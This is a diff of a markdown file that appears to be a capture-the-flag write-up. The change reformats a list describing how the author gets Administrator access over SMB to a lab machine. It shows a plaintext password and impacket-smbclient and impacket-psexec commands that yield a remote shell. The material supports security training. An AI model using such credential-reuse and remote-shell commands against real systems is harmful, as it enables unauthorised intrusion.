@@ -225,11 +225,12 @@ less .bash_history
 ```
 ### SMB shell access as Administrator with psexec
 We can use the Administrator SMB credentials to get access and get the root.txt flag. To do that, we have two options:
-- 1. Get SMB access and search for root.txt in the directories:
+
+1. Get SMB access and search for root.txt in the directories:
 ```shell
 impacket-smbclient administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.143.191
 ```
-- 2. Or the one I prefer, use impacket-psexec to get a shell, since the Administrator user has write rights:
+2. Or the one I prefer, use impacket-psexec to get a shell, since the Administrator user has write rights:
 ```shell
 impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.143.191
 ```
